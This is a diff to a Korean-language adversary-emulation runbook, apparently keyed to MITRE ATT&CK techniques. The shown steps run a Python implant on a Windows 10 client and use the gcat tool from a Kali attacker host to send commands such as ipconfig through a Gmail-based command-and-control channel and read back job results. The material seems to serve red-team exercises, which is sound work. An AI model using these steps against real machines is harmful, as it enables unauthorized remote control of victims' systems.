@@ -109,7 +109,8 @@ Step 1. 클라이언트(Windows10)에서 cmd 실행
 
 Step 2. cd C:\Users\USER.CONTOSO\Desktop
 
-Step 3. implant.py
+Step 3. implant 실행 (python2로 실행해야 함)
+  python implant.py
 
 Step 4. 공격자서버(kali Linux)에서 gcat 폴더로 이동
   cd /home/kali/Desktop/gcat/gcat-master
@@ -122,8 +123,6 @@ Step 6. 클라이언트 id를 넣고 ipconfig 명령 실행
 
 Step 7. 위 명령 실행 후 출력되는 jobid를 아래 명령어에 넣어 확인
   python gcat.py -id <id> -jobid <jobid>
-  
-Step 8. check your mail in gmail (gcat.py, implant.py - id/pw)
 
 #------------------------------------------------------------
 # Impact - System Shutdown/Reboot(T1529) T1529 - System Shutdown/Reboot
